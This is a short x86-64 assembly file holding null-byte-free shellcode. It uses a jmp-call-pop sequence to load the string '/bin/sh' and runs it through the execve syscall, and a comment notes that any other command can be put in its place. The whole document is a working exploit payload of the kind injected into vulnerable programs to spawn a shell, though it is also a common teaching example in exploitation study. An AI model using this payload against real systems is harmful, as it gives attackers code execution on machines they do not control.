BITS 64
    GLOBAL _start
_start:
    jmp short .data

; a simple null-byte free execve(command,0,0) call
.text:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov al, 0x3b
    syscall

.data:
    call .text
    db '/bin/sh', 0x00 ; can be any other command of course